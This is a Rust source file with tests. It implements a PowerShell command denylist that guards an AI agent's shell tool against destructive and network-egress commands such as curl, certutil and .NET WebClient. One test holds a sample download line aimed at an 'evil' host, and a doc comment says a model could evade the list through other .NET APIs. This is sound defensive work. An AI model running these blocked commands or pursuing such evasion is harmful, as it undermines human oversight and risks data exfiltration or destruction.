//! Shell command denylist for both built-in tools and extensions.
//!
//! [`CommandDenylist`] checks commands against a list of denied names,
//! substrings, and flag combinations before execution. The built-in
//! `RunCommand` tool and extension `rho.runCommand()` ops both use this to
//! reject dangerous commands.

use crate::RhoConfig;
use tracing::debug;

// ── CommandDenylist ───────────────────────────────────────────────────────────

/// A denylist of dangerous shell commands.
///
/// Commands are checked before execution. If a command matches a denied name,
/// a denied substring, or a denied flag combination, it is refused with an
/// error message.
///
/// The default PowerShell denylist blocks commands that can delete files,
/// exfiltrate data, or change system security settings. Config-driven
/// customisation is appended on top of the built-in list.
///
/// # Coverage honesty
///
/// The denylist catches the most common exfiltration vectors (PowerShell
/// networking cmdlets, `curl`, `wget`, LOLBINs, direct .NET HTTP/socket
/// access). It does **not** provide complete network egress control — a
/// determined model can construct network requests using .NET APIs that
/// aren't in the substring list, or use other creative escape paths. The
/// approval gate is the primary defense; the denylist is a best-effort
/// safety net. Full egress control requires OS-level network filtering,
/// which is out of scope.
#[allow(clippy::struct_field_names)]
#[derive(Debug, Clone)]
pub struct CommandDenylist {
    /// Command names that are always denied (lowercase, for case-insensitive matching).
    /// Only the first whitespace-delimited token is checked against this list.
    denied_commands: Vec<String>,
    /// Substrings that are denied anywhere in the command (not just the first
    /// token). Used for .NET type names and other patterns that appear
    /// mid-command (e.g., `[System.Net.WebClient]`).
    ///
    /// To avoid false positives, substrings should be specific enough to
    /// match the intended pattern without catching benign variable names.
    /// For example, `WebClient` matches `[System.Net.WebClient]` but would
    /// also match `$WebClientResult` — so the list uses bracket-prefixed
    /// forms like `[System.Net.WebClient` and `.WebClient` to reduce
    /// false positives while still catching type references.
    denied_substrings: Vec<String>,
    /// Flag combinations — all flags in a combo must be present to deny.
    /// Each combo is a set of lowercase flags.
    denied_flag_combos: Vec<Vec<String>>,
}

impl CommandDenylist {
    /// Create the default PowerShell denylist.
    ///
    /// Blocks:
    /// - **Destructive commands:** `Remove-Item`, `Start-Process`,
    ///   `New-Service`, `Set-ExecutionPolicy`
    /// - **PowerShell network egress:** `Invoke-WebRequest`, `Invoke-RestMethod`
    /// - **External network tools:** `curl`, `wget`, `bitsadmin`, `certutil`
    /// - **.NET direct network access:** `[System.Net.WebClient`,
    ///   `[System.Net.Http.HttpClient`, `[System.Net.Sockets.TcpClient`
    ///   (substring matches that catch type-accelerator and full-qualified forms)
    /// - **Flag combinations:** `-Recurse` + `-Force`
    pub fn default_powershell() -> Self {
        Self {
            denied_commands: vec![
                // Destructive
                "remove-item",
                // PowerShell network egress
                "invoke-webrequest",
                "invoke-restmethod",
                // Process / system modification
                "start-process",
                "new-service",
                "set-executionpolicy",
                // External network tools (cross-platform)
                "curl",
                "wget",
                // Windows LOLBINs (harmless if not present on Unix)
                "bitsadmin",
                "certutil",
            ]
            .into_iter()
            .map(String::from)
            .collect(),
            denied_substrings: vec![
                // .NET direct network access — these appear mid-command,
                // not as the first token. Match on the type name preceded
                // by `[` (PowerShell type reference) or `.` (method call).
                "[system.net.webclient",
                ".webclient]",
                "[system.net.http.httpclient",
                ".httpclient]",
                "[system.net.sockets.tcpclient",
                ".tcpclient]",
            ]
            .into_iter()
            .map(String::from)
            .collect(),
            denied_flag_combos: vec![vec!["-recurse".to_owned(), "-force".to_owned()]],
        }
    }

    /// Create the default PowerShell denylist with additional commands from
    /// config.
    ///
    /// The built-in denylist is always applied. Config-supplied commands and
    /// flag combos are appended.
    pub fn from_config(config: &RhoConfig) -> Self {
        let mut base = Self::default_powershell();
        let config_commands = &config.shell.denied_commands;
        let config_combos = &config.shell.denied_flag_combos;
        base.denied_commands.extend(
            config
                .shell
                .denied_commands
                .iter()
                .map(|c| c.to_lowercase()),
        );
        base.denied_flag_combos.extend(
            config
                .shell
                .denied_flag_combos
                .iter()
                .map(|combo| combo.iter().map(|f| f.to_lowercase()).collect()),
        );
        debug!(
            built_in_commands = Self::default_powershell().denied_commands.len(),
            config_commands = config_commands.len(),
            config_combos = config_combos.len(),
            "denylist loaded from config"
        );
        base
    }

    /// Check if a command is denied.
    ///
    /// Returns `Some(reason)` if the command should be blocked, `None` if it
    /// is allowed.
    pub fn check(&self, command: &str) -> Option<String> {
        debug!(command = %command, "denylist: checking command");

        // Extract the first token (command name).
        let first_token = command
            .split_whitespace()
            .next()
            .unwrap_or("")
            .to_lowercase();

        // Check command name denylist.
        if self.denied_commands.contains(&first_token) {
            return Some(format!("command '{first_token}' is on the denylist"));
        }

        let command_lower = command.to_lowercase();

        // Check substring denylist (for patterns that appear mid-command,
        // e.g. .NET type references like [System.Net.WebClient]).
        for substring in &self.denied_substrings {
            if command_lower.contains(substring.as_str()) {
                return Some(format!("command contains denied pattern: '{substring}'"));
            }
        }

        // Check flag combinations.
        for combo in &self.denied_flag_combos {
            if combo
                .iter()
                .all(|flag| command_lower.contains(flag.as_str()))
            {
                return Some(format!(
                    "command contains denied flag combination: {}",
                    combo.join(" + ")
                ));
            }
        }

        None
    }
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn denylist_default_blocks_remove_item() {
        let dl = CommandDenylist::default_powershell();
        assert!(dl.check("Remove-Item -Path foo").is_some());
    }

    #[test]
    fn denylist_default_blocks_invoke_webrequest() {
        let dl = CommandDenylist::default_powershell();
        assert!(dl.check("Invoke-WebRequest https://example.com").is_some());
    }

    #[test]
    fn denylist_default_blocks_curl() {
        let dl = CommandDenylist::default_powershell();
        assert!(dl.check("curl https://example.com").is_some());
    }

    #[test]
    fn denylist_default_allows_cargo() {
        let dl = CommandDenylist::default_powershell();
        assert!(dl.check("cargo build").is_none());
    }

    #[test]
    fn denylist_default_allows_echo() {
        let dl = CommandDenylist::default_powershell();
        assert!(dl.check("echo hello").is_none());
    }

    #[test]
    fn denylist_blocks_dotnet_webclient() {
        let dl = CommandDenylist::default_powershell();
        assert!(
            dl.check("[System.Net.WebClient]::new().DownloadString('http://evil')")
                .is_some()
        );
    }

    #[test]
    fn denylist_blocks_flag_combo() {
        let dl = CommandDenylist::default_powershell();
        assert!(
            dl.check("Get-ChildItem -Recurse -Force -Path foo")
                .is_some()
        );
    }

    #[test]
    fn denylist_allows_single_flag() {
        let dl = CommandDenylist::default_powershell();
        assert!(dl.check("Get-ChildItem -Recurse -Path foo").is_none());
    }

    #[test]
    fn denylist_from_config_appends_commands() {
        let mut config = RhoConfig::default();
        config.shell.denied_commands.push("Stop-Process".to_owned());
        let dl = CommandDenylist::from_config(&config);
        // Built-in denylist still works
        assert!(dl.check("Remove-Item -Path foo").is_some());
        // Config-added command also blocked
        assert!(dl.check("Stop-Process -Name notepad").is_some());
        // Non-denied command still passes
        assert!(dl.check("cargo build").is_none());
    }

    #[test]
    fn denylist_from_config_appends_flag_combos() {
        let mut config = RhoConfig::default();
        config
            .shell
            .denied_flag_combos
            .push(vec!["-Quiet".to_owned(), "-Force".to_owned()]);
        let dl = CommandDenylist::from_config(&config);
        // Built-in combo still works
        assert!(dl.check("Get-ChildItem -Recurse -Force").is_some());
        // Config-added combo also blocked
        assert!(dl.check("Remove-Item -Quiet -Force -Path foo").is_some());
    }
}
